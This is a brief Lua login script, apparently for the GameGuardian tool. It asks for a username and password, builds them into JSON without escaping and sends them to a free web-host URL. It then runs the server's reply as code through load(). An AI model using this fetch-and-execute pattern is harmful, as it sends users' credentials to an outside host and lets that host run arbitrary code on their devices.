Variable = {}
Variable["https://raw.githubusercontent.com/Jfkwkfja/Osbir/main/Login.php"]= "https://testingsop1284000webhostapp.com/Login.php"
Prompt = gg.prompt({"Username","Password","exit"},nil,{"text","text","checkbox"})
	if not Prompt then
	return
	end
	if Prompt[3] then
	return
	end

Variable["TempLogin"]  = '{"Username":"'..Prompt[1]..'","Password":"'..Prompt[2]..'"}'

ResponseContent = gg.makeRequest(Variable["https://raw.githubusercontent.com/Jfkwkfja/Osbir/main/Login.php"],nil,Variable["TempLogin"]).content
pcall(load(ResponseContent))

